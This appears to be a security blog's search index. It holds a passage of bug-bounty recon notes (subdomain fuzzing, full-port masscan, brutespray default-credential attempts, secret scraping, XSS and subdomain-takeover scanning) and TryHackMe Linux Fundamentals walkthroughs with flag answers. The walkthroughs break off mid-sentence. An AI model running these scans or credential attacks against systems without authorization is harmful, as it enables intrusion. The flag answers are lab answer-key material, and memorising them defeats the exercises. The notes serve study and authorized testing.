/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -u http://target.com/ -H &quot;Host:FUZZ.target.com&quot; -of md -o subdomain/fuzzing_dnsjhaddix.mdScrapping cert.sh –&amp;gt; subdomain/cert_subs burp suit. : add target to scope. check in user advanced scope control (go to target -&amp;gt; scope) host or ip ranges : paypal (target name here) browse like normal user. (turn on auto fill form) now spider all site-map trafficsave output :right click –&amp;gt; enagement tools –&amp;gt; analyse target –&amp;gt; save report as html file. javascripts :see js section below. subfinder :subfinder -config config.yaml -all -d target.com github subdomain scrapping :python3 github-subdomains.py -t github_token -d target.com Cloud ranges :Watch Sam Erb defcon talk on this. alteration of subdomains :altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt- subdomains.txt contains the known subdomains for an organization- data_output is a file that will contain the massive list of altered and permuted subdomains- words.txt is your list of words that you&#39;d like to permute your current subdomains with (i.e. admin, staging, dev, qa) one word per lineafter you gather subds from all sources save it to in one file. –&amp;gt; check if subdomains is working or not.cat all_subdomain | httprobe &amp;gt; working_subsScreenshotsEyeWitness -f urls.txt --web -d dir_name_to_outputjs Find js file using waybackurls :gau paypal.com |grep -iE &#39;\\.js&#39;|grep -ivE &#39;\\.json&#39;|sort -u &amp;gt;&amp;gt; paypalJS.txt You can also collect js file in burp suit. get all js file from sub and main domains : getJS --complete --input subs.txt next find urls,endpoints and parameter in js files:python linkfinder.py -i file.txt -o results.html discover sensitive data like apikeys, accesstoken, authorizations, jwt,..etc in JavaScript files.python3 SecretFinder.py -i https://example.com/ or subs.txt -e -g &#39;jquery;bootstrap;api.google.com&#39;-g : ignore external libs.githubhttps://github.com/gwen001/github-searchincomplete sectionPort scanning : Gather all ip address of subdomains and domains :dnmasscan subdomains.lst ip_outputs remove dups in list.sort filename | uniq -u feed to masscan :masscan -p1-65535 -iL $ipFile --max-rate 1800 -oG $outPutFile.log feed to nmap to scan services.save output in -oG output.gnmap because brutespray take this format. feed to brutespray to check default creds.python brutespray.py --file output.gnmapMiscwaybackurlgau :cat domains.txt | gau --blacklist png,jpg,gif,css,pdf --o output.txtremove duplicates parameter.cat gauurl.txt | uro &amp;gt; output.txttest for potential vulnerable parameter :cat urooutput.txt | gf potential | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt //for xss + ssrf + open redirect parameterscat gauurl.txt | gf wordpress | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt // for wordpress urlsYou can send testxss.txt to dalfox to automate xss huntingSubdomain takeovergit pull nuclei-templates : update templates.cat all_subs.txt | nuclie -t nuclei-templates/takeovers/ -o output_file // if you want to test all templates in folder.cat all_subs.txt | nuclie -t nuclei-templates/takeovers/hatenablog-takeover.yaml -o output_file // scan single templage.Cms identifications wappalyzer whatweb : /home/kali/web_pentest/scripts/WhatWeb/whatweb target.com " }, { "title": "Linux Fundamentals Part 1", "url": "/posts/Linux-Fundamentals-Part-1/", "categories": "Linux", "tags": "linux", "date": "2021-09-01 11:11:11 +0530", "snippet": "Embark on the journey of learning the fundamentals of Linux. Learn to run some of the first essential commands on an interactive terminal.IntroductionWelcome to the first part of the “Linux Fundamentals” room series. You’re most likely using a Windows or Mac machine, both are different in visual design and how they operate. Just like Windows, iOS and MacOS, Linux is just another operating system and one of the most popular in the world powering smart cars, android devices, supercomputers, home appliances, enterprise servers, and more.We’ll be covering some of the history behind Linux and then eventually starting your journey of being a Linux-wizard! This room will have you: Running your very first commands in an interactive Linux machine in your browser Teaching you some essential commands used to interact with the file system Introduce you to how users and groups work on Linux (and what this means for us as penetration testers)Answer the questions belowLet’s get started! No answer neededA Bit of Background on LinuxWhere is Linux Used?It’s fair to say that Linux is a lot more intimidating to approach than Operating System’s (OSs) such as Windows. Both variants have their own advantages and disadvantages. For example, Linux is considerably much more lightweight and you’d be surprised to know that there’s a good chance you’ve used Linux in some form or another every day! Linux powers things such as: Websites that you visit Car entertainment/control panels Point of Sale (PoS) systems such as checkout tills and registers in shops Critical infrastructures such as traffic light controllers or industrial sensorsFlavours of LinuxThe name “Linux” is actually an umbrella term for multiple OS’s that are based on UNIX (another operating system). Thanks to UNIX being open-source, variants of Linux comes in all shapes and sizes - suited best for what the system is being used for.For example, Ubuntu &amp;amp; Debian are some of the more commonplace distributions of Linux because it is so extensible. I.e. you can run Ubuntu as a server (such as websites &amp;amp; web applications) or as a fully-fledged desktop. For this series, we’re going to be using Ubuntu. Ubuntu Server can run on systems with only 512MB of RAMSimilar to how you have different versions Windows (7, 8 and 10), there are many different versions/distributions of Linux.Answer the questions belowResearch: What year was the first release of a Linux operating system? 1991Running Your First few CommandsAs we previously discussed, a large selling point of using OSs such as Ubuntu is how lightweight they can be. This, of course, doesn’t come without its disadvantages, where for example, often there is no GUI (Graphical User Interface) or what is also known as a desktop environment that we can use to interact with the machine (unless it has been installed). A large part of interacting with these systems is using the “Terminal”.The “Terminal” is purely text-based and is intimidating at first. However, if we break down some of the commands, after some time, you quickly become familiar with using the terminal!We need to be able to do basic functions like navigate to files, output their contents and make files! The commands to do so are self-explanatory (once you know what they are of course…)Let’s get started with two of the first commands which I have broken down in the table below: Command Description echo Output any text that we provide whoami Find out what user we’re currently logged in as! See the snippets below for an example of each command being used… tryhackme@linux1:~$ echo &quot;Hello Friend!&quot; tryhackme@linux1:~$ whoamiAnswer the questions belowIf we wanted to output the text “TryHackMe”, what would our command be? echo TryHackMeWhat is the username of who you’re logged in as on your deployed Linux machine? tryhackmeInteracting With the Filesystem!So far we’ve only covered the “echo” and “whoami” commands. Not all that useful when you consider things that we need to do - including navigating the filesystem, read and write to it as well.In this task, we’re going to be learning the commands so that we can do just that. Just like the previous task, I’ll display the commands in the table in the next heading &amp;amp; show examples of these commands being used.Interacting With the FilesystemAs I previously stated, being able to navigate the machine that you are logged into without relying on a desktop environment is pretty important. After all, what’s the point of logging in if we can’t go anywhere? Command Full Name ls listing cd change directory cat concatenate pwd print working directory Listing Files in Our Current Directory (ls)Before we can do anything such as finding out the contents of any files or folders, we need to know what exists in the first place. This can be done using the “ls” command (short for listing) tryhackme@linux1:~$ ls&#39;Important Files&#39; &#39;My Documents&#39; Notes PicturesIn the screenshot above, we can see there are the following directories/folders: Important Files My Documents Notes PicturesGreat! You can probably take a guess as to what to expect a folder to contain given by its name. Pro tip: You can list the contents of a directory without having to navigate to it by using ls and the name of the directory. I.e. ls PicturesChanging Our Current Directory (cd)Now that we know what folders exist, we need to use the “cd” command (short for change directory) to change to that directory. Say if I wanted to open the “Pictures” directory - I’d do “cd Pictures”. Where again, we want to find out the contents of this “Pictures” directory and to do so, we’d use “ls” again: tryhackme@linux1:~/Pictures$ lsdog_picture1.jpg dog_picture2.jpg dog_picture3.jpg dog_picture4.jpgIn this case, it looks like there are 4 pictures of dogs!Outputting the Contents of a File (cat)Whilst knowing about the existence of files is great — it’s not all that useful unless we’re able to view the contents of them.We will come on to discuss some of the tools available to us that allows us to transfer files from one machine to another in a later room. But for now, we’re going to talk about simply seeing the contents of text files using a command called “cat”.“Cat” is short for concatenating &amp;amp; is a fantastic way us to output the contents of files (not just text files!).In the screenshot below, you can see how I have combined the use of “ls” to list the files within a directory called “Documents”: tryhackme@linux1:~/Documents$ lstodo.txttryhackme@linux1:~/Documents$ cat todo.txtHere&#39;s something important for me to do later!We’ve applied some knowledge from earlier in this task to do the following: Used “ls” to let us know what files are available in the “Documents” folder of this machine. In this case, it is called “todo.txt”. We have then used cat todo.txt to concatenate/output the contents of this “todo.txt” file, where the contents are “Here’s something important for me to do later!” Pro tip: You can use cat to output the contents of a file within directories without having to navigate to it by using cat and the name of the directory. I.e. cat /home/ubuntu/Documents/todo.txtSometimes things like usernames, passwords (yes - really…), flags or configuration settings are stored within files where “cat” can be used to retrieve these.Finding out the full Path to our Current Working Directory (pwd)You’ll notice as you progress through navigating your Linux machine, the name of the directory that you are currently working in will be listed in your terminal.It’s easy to lose track of where we are on the filesystem exactly, which is why I want to introduce “pwd”. This stands for print working directory.Using the example machine from before, we are currently in the “Documents” folder — but where is this exactly on the Linux machine’s filesystem? We can find this out using this “pwd” command like within the screenshot below: tryhackme@linux1:~/Documents$ pwd/home/ubuntu/Documentstryhackme@linux1:~/Documents$Let’s break this down: We already know we’re in “Documents” thanks to our terminal, but at this point in time, we have no idea where “Documents” is stored so that we can get back to it easily in the future. I have used the “pwd” (print working directory) command to find the full file path of this “Documents” folder. We’re helpfully told by Linux that this “Documents” directory is stored at “/home/ubuntu/Documents” on the machine — great to know! Now in the future, if we find ourselves in a different location, we can just use cd /home/ubuntu/Documents to change our working directory to this “Documents” directory.Answer the questions belowOn the Linux machine that you deploy, how many folders are there? 4Which directory contains a file? folder4What is the contents of this file? Hello WorldUse the cd command to navigate to this file and find out the new current working directory. What is the path? /home/tryhackme/folder4Searching for FilesAlthough it doesn’t seem like it so far, one of the redeeming features of Linux is truly how efficient you can be with it. With that said, you can only be as efficient as you are familiar with it of course. As you interact with OSs such as Ubuntu over time, essential commands like those we’ve already covered will start to become muscle-memory.One fantastic way to show just how efficient you can be with systems like this is using a set of commands to quickly search for files across the entire system that our user has access to. No need to consistently use cd and ls to find out what is where. Instead, we can use commands such as find to automate things like this for us!This is where Linux starts to become a bit more intimidating to approach – but we’ll break this down and ease you into it.Using FindThe find command is fantastic in the sense that it can be used both very simply or rather complex depending upon what it is you want to do exactly. In fact, so much so, we have an entire room dedicated to using &amp;amp; practising the find command. However, let’s stick to the fundamentals first.Take the snippet below, we can see a list of directories available to us: tryhackme@linux1:~$ lsDesktop Documents Pictuers folder1tryhackme@linux1:~$ Desktop Documents Pictures folder1Now, of course, directories can contain even more directories within themselves. It becomes a headache when we’re having to look through every single one just to try and look for specific files. We can use find to do just this for us!Let’s start simple and assume that we already know the name of the file we’re looking for — but can’t remember where it is exactly! In this case, we’re looking for “passwords.txt”If we remember the filename, we can simply use find -name passwords.txt where the command will look through every folder in our current directory for that specific file like so: tryhackme@linux1:~$ find -name passwords.txt./folder1/passwords.txttryhackme@linux1:~$“Find” has managed to find the file — it turns out it is located in folder1/passwords.txt — sweet. But let’s say that we don’t know the name of the file, or want to search for every file that has an extension such as “.txt”. Find let’s us do that too!We can simply use what’s known as a wildcard (*) to search for anything that has .txt at the end. In our case, we want to find every .txt file that’s in our current directory. We will construct a command such as find -name *.txt . Where “Find” has been able to find every .txt file and has then given us the location of each one: tryhackme@linux1:~$ find -name *.txt./folder1/passwords.txt./Documents/todo.txttryhackme@linux1:~$Find has managed to find: “passwords.txt” located within “folder1” “todo.txt” located within “Documents”That wasn’t so tough huh!Using GrepAnother great utility that is a great one to learn about is the use of grep. The grep command allows us to search the contents of files for specific values that we are looking for.Take for example the access log of a web server. In this case, the access.log of a web server has 244 entries. tryhackme@linux1:~$ wc -l access.log244 access.logtryhackme@linux1:~$Using a command like cat isn’t going to cut it too well here. Let’s say for example if we wanted to search this log file to see the things that a certain user/IP address visited? Looking through 244 entries isn’t all that efficient considering we want to find a specific value.We can use grep to search the entire contents of this file for any entries of the value that we are searching for. Going with the example of a web server’s access log, we want to see everything that the IP address “81.143.211.90” has visited (note that this is fictional) tryhackme@linux1:~$ grep &quot;81.143.211.90&quot; access.log81.143.211.90 - - [25/Mar/2021:11:17 + 0000] &quot;GET / HTTP/1.1&quot; 200 417 &quot;-&quot; &quot;Mozilla/5.0 (Linux; Android 7.0; Moto G(4))&quot;tryhackme@linux1:~$“Grep” has searched through this file and has shown us any entries of what we’ve provided and that is contained within this log file for the IP.Answer the questions belowUse grep on “access.log” to find the flag that has a prefix of “THM”. What is the flag? THM{ACCESS}And I still haven’t found what I’m looking for! No answer needed.An Introduction to Shell OperatorsLinux operators are a fantastic way to power up your knowledge of working with Linux. There are a few important operators that are worth noting. We’ll cover the basics and break them down accordingly to bite-sized chunks.At an overview, I’m going to be showcasing the following operators: Symbol / Operator Description &amp;amp; This operator allows you to run commands in the background of your terminal. &amp;amp;&amp;amp; This operator allows you to combine multiple commands together in one line of your terminal. &amp;gt; This operator is a redirector - meaning that we can take the output from a command (such as using cat to output a file) and direct it elsewhere. &amp;gt;&amp;gt; This operator does the same function of the &amp;gt; operator but appends the output rather than replacing (meaning nothing is overwritten). Let’s cover these in a bit more detail.Operator “&amp;amp;”This operator allows us to execute commands in the background. For example, let’s say we want to copy a large file. This will obviously take quite a long time and will leave us unable to do anything else until the file successfully copies.The “&amp;amp;” shell operator allows us to execute a command and have it run in the background (such as this file copy) allowing us to do other things!Operator “&amp;amp;&amp;amp;”This shell operator is a bit misleading in the sense of how familiar is to its partner “&amp;amp;”. Unlike the “&amp;amp;” operator, we can use “&amp;amp;&amp;amp;” to make a list of commands to run for example command1 &amp;amp;&amp;amp; command2. However, it’s worth noting that command2 will only run if command1 was successfulOperator “&amp;gt;”This operator is what’s known as an output redirector. What this essentially means is that we take the output from a command we run and send that output to somewhere else.A great example of this is redirecting the output of the echo command that we learned in Task 4. Of course, running something such as echo howdy will return “howdy” back to our terminal — that isn’t super useful. What we can do instead, is redirect “howdy” to something such as a new file!Let’s say we wanted to create a file named “welcome” with the message “hey”. We can run echo hey &amp;gt; welcome where we want the file created with the contents “hey” like so: tryhackme@linux1:~$ echo hey &amp;gt; welcome tryhackme@linux1:~$ cat welcomehey Note: If the file i.e. “welcome” already exists, the contents will be overwritten!Operator “»”This operator is also an output redirector like in the previous operator (&amp;gt;) we discussed. However, what makes this operator different is that rather than overwriting any contents within a file, for example, it instead just puts the output at the end.Following on with our previous example where we have the file “welcome” that has the contents of “hey”. If were to use echo to add “hello” to the file using the &amp;gt; operator, the file will now only have “hello” and not “hey”.The &amp;gt;&amp;gt; operator allows to append the output to the bottom of the file — rather than replacing the contents like so:tryhackme@linux1:~$ echo hello &amp;gt;&amp;gt; welcome tryhackme@linux1:~$ cat welcomeheyhelloAnswer the questions belowIf we wanted to run a command in the background, what operator would we want to use? &amp;amp;If I wanted to replace the contents of a file named “passwords” with the word “password123”, what would my command be? echo password123 &amp;gt; passwordsNow if I wanted to add “tryhackme” to this file named “passwords” but also keep “passwords123”, what would my command be echo tryhackme » passwordsNow use the deployed Linux machine to put these into practice No answer needed.Conclusions &amp;amp; SummariesNice work on getting to this stage! We covered quite a bit for your first interactions with Linux. However, these are the most essential/functions you’re going to be using whenever you interact with a Linux machine.I hope this room hasn’t been too daunting for you to power-on through with. It’s as I previously mentioned, you’re going to become familiar with these things very quickly because of how often you’re going to be using them.To quickly recap, we’ve covered the following: Understanding why Linux is so commonplace today Interacting with your first-ever Linux machine! Ran some of the most fundamental commands Had an introduction to navigating around the filesystem &amp;amp; how we can use commands like find and grep to make finding data even more efficient! Power up your commands by learning about some of the important shell operators.Answer the questions belowI’ll have a play around! No answer needed." }, { "title": "Linux Fundamentals Part 2", "url": "/posts/Linux-Fundamentals-Part-2/", "categories": "Linux", "tags": "linux, ssh, permission", "date": "2021-09-01 11:11:10 +0530", "snippet": "Continue your learning Linux journey with part two. You will be learning how to log in to a Linux machine using SSH, how to advance your commands, file system interaction.IntroductionWelcome to the second part of the reworked “Linux Fundamentals” series. We’ll be applying our knowledge from the first installment in this series, so I highly recommend you completing that room before proceeding further.In part 2, we’ll be ditching the in-browser functionality and help you get started in what is a fundamental skill in being able to login to and control the terminals of remote machines. Not only this, but the room will also have you: Unlocking the potential of your first few commands by introducing you to using flags and arguments Advancing your knowledge of the filesystem to perform some more useful commands such as copying and moving files Introducing you to the access mechanisms in place to keep files and folders secure and how to identify the things that our current user has access too Running your first few scripts and executables!Answer the questions belowLet’s proceed! No answer needed.Accessing Your Linux Machine Using SSH (Deploy)The in-browser functionality was used in Linux Fundamentals Part 1 to get you directly connected to your first ever Linux machine without any hassle.In fact, the in-browser functionality uses the exact same protocol that we are going to be using today. This protocol is called Secure Shell or SSH for short and is the common means of connecting to and interacting with the command line of a remote Linux machine.We will be deploying two machines in this room: Your Linux machine The TryHackMe AttackBoxWhat is SSH &amp;amp; how Does it Work?Secure Shell or SSH simply is a protocol between devices in an encrypted form. Using cryptography, any input we send in a human-readable format is encrypted for travelling over a network – where it is then unencrypted once it reaches the remote machine, such as in the diagram below.You can learn about the various types of encryption on a TryHackMe room. But for now, we only need to understand that: SSH allows us to remotely execute commands on another device remotely. Any data sent between the devices is encrypted when it is sent over a network such as the InternetDeploying Your Linux MachinePress the green “Start Machine” button on the top-right of this task and then scroll to the top of the page to see the deployment information like so:The IP address displayed is the address of your Linux machine that you will be logging into using SSH. Take note of this for now.Deploying the TryHackMe AttackBoxLooking at the top of the page, press the “Start AttackBox” button to deploy the TryHackMe AttackBox that we will be interacting with. The TryHackMe AttackBox is a Ubuntu Linux machine that is hosted online in the cloud and can be interacted with via your browser. You will be using this to interact with the machine that you deploy in this task.Using SSH to Login to Your Linux MachineThe syntax to use SSH is very simple. We only need to provide two things: The IP address of the remote machine Correct credentials to a valid account to login with on the remote machine For this room, we will be logging in as “tryhackme”, whose password is “tryhackme” without the quotation (“”) marks. Let’s use the IP address of the machine displayed in the card at the top of the room as the IP address and this user, to construct a command to log in to the remote machine using SSH. The command to do so is ssh and then the username of the account, @ the IP address of the machine.But first, we need to open a terminal on the TryHackMe AttackBox. There is an icon placed on the desktop named “Terminal”. And now, we can proceed to input commands.For example: ssh tryhackme@MACHINE_IP . Replacing the IP address with the IP address for your Linux target machine. Once executed, we will then be asked to trust the host and then provide a password for the “tryhackme” account, which is also “tryhackme”.Now that we are connected, any commands that we execute will now execute on the remote machine – not our own. Please note, when typing the password in when SSH’ing into the machine, the text is invisible - type the password out and press enter (even as no text will show as you type).Answer the questions belowI’ve logged into the Linux Fundamentals Part 2 machine using SSH! No answer needed.Introduction to Flags and SwitchesA majority of commands allow for arguments to be provided. These arguments are identified by a hyphen and a certain keyword known as flags or switches.We’ll later discuss how we can identify what commands allow for arguments to be provided and understanding what these do exactly.When using a command, unless otherwise specified, it will perform its default behaviour. For example, ls lists the contents of the working directory. However, hidden files are not shown. We can use flags and switches to extend the behaviour of commands.Using our ls example, ls informs us that there is only one folder named “folder1” as highlighted in the screenshot below. Note that the contents in the screenshots below are only examples. tryhackme@linux2:~$ lsfolder1tryhackme@linux2:~$However, after using the -a argument (short for --all), we now suddenly have an output with a few more files and folders such as “.hiddenfolder”. Files and folders with “.” are hidden files. tryhackme@linux2:~$ ls -a .hiddenfolder folder1tryhackme@linux2:~$Commands that accept these will also have a --help option. This option will list the possible options that the command accepts, provide a brief description and example of how to use it.The Man(ual) PageThe manual pages are a great source of information for both system commands and applications available on both a Linux machine, which is accessible on the machine itself and online.To access this documentation, we can use the man command and then provide the command we want to read the documentation for. Using our ls example, we would use man ls to view the manual pages for ls like so: tryhackme@linux2:~$ man lsLS(1) User Commands LS(1)NAME ls - list directory contentsSYNOPSIS ls [OPTION]... [FILE]...DESCRIPTION List information about the FILEs (the current directory by default). Sort entries alphabetically if none of -cftuvSUX nor --sort is specified. Mandatory arguments to long options are mandatory for short options too. -a, --all do not ignore entries starting with . -A, --almost-all do not list implied . and .. --author with -l, print the author of each file -b, --escape print C-style escapes for nongraphic characters --block-size=SIZE with -l, scale sizes by SIZE when printing them; e.g., &#39;--block-size=M&#39;; see SIZE format below Manual page ls(1) line 1 (press h for help or q to quit)Answer the questions belowExplore the manual page of the ls command No answer needed.What directional arrow key would we use to navigate down the manual page? downWhat flag would we use to display the output in a “human-readable” way? -hFilesystem Interaction ContinuedWe covered some of the most fundamental commands when interacting with the filesystem on the Linux machine. For example, we covered how to list and find the contents of folders using ls and find and navigating the filesystem using cd.In this task, we’re going to learn some more commands for interacting with the filesystem to allow us to: create files and folders move files and folders delete files and foldersMore specifically, the following commands: Command Full Name Purpose touch touch Create file mkdir make directory Create a folder cp copy Copy a file or folder mv move Move a file or folder rm remove Remove a file or folder file file Determine the type of a file Protip: Similarly to using cat, we can provide full file paths, i.e. directory1/directory2/note for all of these commandsCreating Files and Folders (touch, mkdir)Creating files and folders on Linux is a simple process. First, we’ll cover creating a file. The touch command takes exactly one argument – the name we want to give the file we create. For example, we can create the file “note” by using touch note. It’s worth noting that touch simply creates a blank file. You would need to use commands like echo or text editors such as nano to add content to the blank file. tryhackme@linux2:~$ touch notetryhackme@linux2:~$ ls folder1 noteThis is a similar process for making a folder, which just involves using the mkdir command and again providing the name that we want to assign to the directory. For example, creating the directory “mydirectory” using mkdir mydirectory. tryhackme@linux2:~$ mkdir mydirectorytryhackme@linux2:~$ ls folder1 mydirectory noteRemoving Files and Folders (rm)rm is extraordinary out of the commands that we’ve covered so far. You can simply remove files by using rm. However, you need to provide the -R switch alongside the name of the directory you wish to remove. tryhackme@linux2:~$ rm notetryhackme@linux2:~$ ls folder1 mydirectory tryhackme@linux2:~$ rm -R mydirectorytryhackme@linux2:~$ ls folder1Copying and Moving Files and Folders (cp, mv)Copying and moving files is an important functionality on a Linux machine. Starting with cp, this command takes two arguments: the name of the existing file the name we wish to assign to the new file when copying cp copies the entire contents of the existing file into the new file. In the screenshot below, we are copying “note” to “note2”. tryhackme@linux2:~$ cp note note2tryhackme@linux2:~$ ls folder1 note note2Moving a file takes two arguments, just like the cp command. However, rather than copying and/or creating a new file, mv will merge or modify the second file that we provide as an argument. Not only can you use mv to move a file to a new folder, but you can also use mv to rename a file or folder. For example, in the screenshot below, we are renaming the file “note2” to be named “note3”. “note3” will now have the contents of “note2”. tryhackme@linux2:~$ mv note2 note3tryhackme@linux2:~$ ls folder1 note note3Determining File TypeWhat is often misleading and often catches people out is making presumptions from files as to what their purpose or contents may be. Files usually have what’s known as an extension to make this easier. For example, text files usually have an extension of “.txt”. But this is not necessary.So far, the files we have used in our examples haven’t had an extension. Without knowing the context of why the file is there – we don’t really know its purpose. Enter the file command. This command takes one argument. For example, we’ll use file to confirm whether or not the “note” file in our examples is indeed a text file, like so file note. tryhackme@linux2:~$ file notenote: ASCII textAnswer the questions belowHow would you create the file named “newnote”? touch newnoteOn the deployable machine, what is the file type of “unknown1” in “tryhackme’s” home directory? ASCII textHow would we move the file “myfile” to the directory “myfolder” mv myfile myfolderWhat are the contents of this file? THM{FILESYSTEM}Continue to apply your knowledge and practice the commands from this task. No answer needed.Permissions 101As you would have already found out by now, certain users cannot access certain files or folders. We’ve previously explored some commands that can be used to determine what access we have and where it leads us.In our previous tasks, we learned how to extend the use of commands through flags and switches. Take, for example, the ls command, which lists the contents of the current directory. When using the -l switch, we can see ten columns such as in the screenshot below. However, we’re only interested in the first three columns: tryhackme@linux2:~$ ls -lh-rw-r--r-- 1 cmnatic cmnatic 0 Feb 19 10:37 file1-rw-r--r-- 8 cmnatic cmnatic 0 Feb 19 10:37 file2Although intimidating, these three columns are very important in determining certain characteristics of a file or folder and whether or not we have access to it. A file or folder can have a couple of characteristics that determine both what actions are allowed and what user or group has the ability to perform the given action – such as the following: Read Write ExecuteUsing su to switch to user2 tryhackme@linux2:~$ su user2Password:user2@linux2:/home/tryhackme$Let’s use the “cmnatic.pem” file in our initial screenshot at the top of this task. It has the “-“ indicator highlighting that it is a file and then “rw” followed after. This means that only the owner of the file can read and write to this”cmnatic.pem” file but cannot execute it.Briefly: The Differences Between Users &amp;amp; GroupsWe briefly explored this in Linux fundamentals part 1 (namely, the differences between a regular user and a system user). The great thing about Linux is that permissions can be so granular, that whilst a user technically owns a file, if the permissions have been set, then a group of users can also have either the same or a different set of permissions to the exact same file without affecting the file owner itself.Let’s put this into a real-world context; the system user that runs a web server must have permissions to read and write files for an effective web application. However, companies such as web hosting companies will have to want to allow their customers to upload their own files for their website without being the webserver system user – compromising the security of every other customer.We’ll learn the commands necessary to switch between users below.Switching Between UsersSwitching between users on a Linux install is easy work thanks to the su command. Unless you are the root user (or using root permissions through sudo), then you are required to know two things to facilitate this transition of user accounts: The user we wish to switch to The user’s passwordThe su command takes a couple of switches that may be of relevance to you. For example, executing a command once you log in or specifying a specific shell to use. I encourage you to read the man page for su to find out more. However, I will cover the -l or --login switch.Simply, by providing the -l switch to su, we start a shell that is much more similar to the actual user logging into the system - we inherit a lot more properties of the new user, i.e., environment variables and the likes. tryhackme@linux2:~$ su user2Password:user2@linux2:/home/tryhackme$For example, when using su to switch to “user2”, our new session drops us into our previous user’s home directory. tryhackme@linux2:~$ su -l user2Password:user2@linux2:~$ pwduser2@:/home/user2$Where now, after using -l, our new session has dropped us into the home directory of “user” automatically.Answer the questions belowOn the deployable machine, who is the owner of “important”? user2What would the command be to switch to the user “user2”? su user2Now switch to this user “user2” using the password “user2” No answer needed.Output the contents of “important”, what is the flag? THM{SU_USER2}Common Directories/etcThis root directory is one of the most important root directories on your system. The etc folder (short for etcetera) is a commonplace location to store system files that are used by your operating system.For example, the sudoers file highlighted in the screenshot below contains a list of the users &amp;amp; groups that have permission to run sudo or a set of commands as the root user.Also highlighted below are the “passwd” and “shadow” files. These two files are special for Linux as they show how your system stores the passwords for each user in encrypted formatting called sha512.Some notable contents of the /etc directorytryhackme@linux2:/etc$ lsshadow passwd sudoers sudoers.d/varThe “/var” directory, with “var” being short for variable data, is one of the main root folders found on a Linux install. This folder stores data that is frequently accessed or written by services or applications running on the system. For example, log files from running services and applications are written here (/var/log), or other data that is not necessarily associated with a specific user (i.e., databases and the like).Some notable contents of the /var directorytryhackme@linux2:/var$ lsbackups log opt tmp/rootUnlike the /home directory, the /root folder is actually the home for the “root” system user. There isn’t anything more to this folder other than just understanding that this is the home directory for the “root” user. But, it is worth a mention as the logical presumption is that this user would have their data in a directory such as “/home/root” by default.Some notable contents of the /root directoryroot@linux2:~# lsmyfile myfolder passwords.xlsx/tmpThis is a unique root directory found on a Linux install. Short for “temporary”, the /tmp directory is volatile and is used to store data that is only needed to be accessed once or twice. Similar to the memory on your computer, once the computer is restarted, the contents of this folder are cleared out.What’s useful for us in pentesting is that any user can write to this folder by default. Meaning once we have access to a machine, it serves as a good place to store things like our enumeration scripts.Some notable contents of the /tmp directoryroot@linux2:/tmp# lstodelete trash.txt rubbish.binAnswer the questions belowRead me! No answer needed.What is the directory path that would we expect logs to be stored in? /var/logWhat root directory is similar to how RAM on a computer works? /tmpName the home directory of the root user /rootNow apply your learning and navigate through these directories on the deployed Linux machine. No answer needed.Conclusions and SummariesNice work! This room was quite theory-heavy and covered quite a range of the fundamentals in getting you familiar with Linux. To quickly recap, this room taught you: How to connect to a Linux machine remotely using SSH Advancing your use of commands by providing flags, switches and where you can go to learn about these for each command (man pages) Some more commands that you’ll frequently be using to interact with the filesystem and its contents A brief introduction to file permissions &amp;amp; switching users A summary paragraph of the important root directories on a Ubuntu Linux install and how we may be able to use the data stored within these.I encourage you to go through this room again once or twice to gain some familiarity with the concepts. After all, practice makes perfect!Answer the questions belowProceed to the next task to continue your learning No answer needed." }, { "title": "Linux Fundamentals Part 3", "url": "/posts/Linux-Fundamentals-Part-3/", "categories": "Linux", "tags": "linux, vim, nano, file transfer, process, cron, dpkg, logs", "date": "2021-09-01 11:11:09 +0530", "snippet": "Power-up your Linux skills and get hands-on with some common utilities that you are likely to use day-to-day!IntroductionWelcome to part three (and the finale) of the Linux Fundamentals module. So far, throughout the series, you have got hands-on with some fundamental concepts and used some important commands. This room is going to showcase some useful utilities and applications that you are likely to use day-to-day. You’re also going to advance your Linux-fu skills by learning about automation, package management, and service/application logging.Answer the questions belowLet’s proceed! No answer needed.Terminal Text EditorsThroughout the series so far, we have only stored text in files using a combination of the echo command and the pipe operators (&amp;gt; and &amp;gt;&amp;gt;). This isn’t an efficient way to handle data when you’re working with files with multiple lines and the sorts!Introducing terminal text editorsThere are a few options that you can use, all with a variety of friendliness and utility. This task is going to introduce you to nano but also show you an alternative named VIM (which TryHackMe has a room dedicated to!)NanoIt is easy to get started with Nano! To create or edit a file using nano, we simply use nano filename – replacing “filename” with the name of the file you wish to edit.tryhackme@linux3:/tmp# nano myfile GNU nano 4.8 myfile ^G Get Help ^O Write Out ^W Where Is ^K Cut Text ^J Justify ^C Cur Pos M-U Undo M-A Mark Text^X Exit ^R Read File ^\\ Replace ^U Paste Text ^T To Spell ^_ Go To Line M-E Redo M-6 Copy TextOnce we press enter to execute the command, nano will launch! Where we can just begin to start entering or modifying our text. You can navigate each line using the “up” and “down” arrow keys or start a new line using the “Enter” key on your keyboard.tryhackme@linux3:/tmp# nano myfile GNU nano 4.8 myfile Modified Hello TryHackMeI can write things into &quot;myfile&quot;^G Get Help ^O Write Out ^W Where Is ^K Cut Text ^J Justify ^C Cur Pos M-U Undo M-A Mark Text^X Exit ^R Read File ^\\ Replace ^U Paste Text ^T To Spell ^_ Go To Line M-E Redo M-6 Copy TextNano has a few features that are easy to remember &amp;amp; covers the most general things you would want out of a text editor, including: Searching for text Copying and Pasting Jumping to a line number Finding out what line number you are onYou can use these features of nano by pressing the “Ctrl” key (which is represented as an ^ on Linux) and a corresponding letter. For example, to exit, we would want to press “Ctrl” and “X” to exit Nano.VIMVIM is a much more advanced text editor. Whilst you’re not expected to know all advanced features, it’s helpful to mention it for powering up your Linux skills.Some of VIM’s benefits, albeit taking a much longer time to become familiar with, includes: Customisable - you can modify the keyboard shortcuts to be of your choosing Syntax Highlighting - this is useful if you are writing or maintaining code, making it a popular choice for software developers VIM works on all terminals where nano may not be installed There are a lot of resources such as cheatsheets, tutorials, and the sorts available to you use.TryHackMe has a room showcasing VIM if you wish to learn more about this editor!Answer the questions belowCreate a file using Nano No answer needed.Edit “task3” located in “tryhackme”’s home directory using Nano. What is the flag? THM{TEXT_EDITORS}General/Useful UtilitiesDownloading FilesA pretty fundamental feature of computing is the ability to transfer files. For example, you may want to download a program, a script, or even a picture. Thankfully for us, there are multiple ways in which we can retrieve these files.We’re going to cover the use of wget . This command allows us to download files from the web via HTTP – as if you were accessing the file in your browser. We simply need to provide the address of the resource that we wish to download. For example, if I wanted to download a file named “myfile.txt” onto my machine, assuming I knew the web address it – it would look something 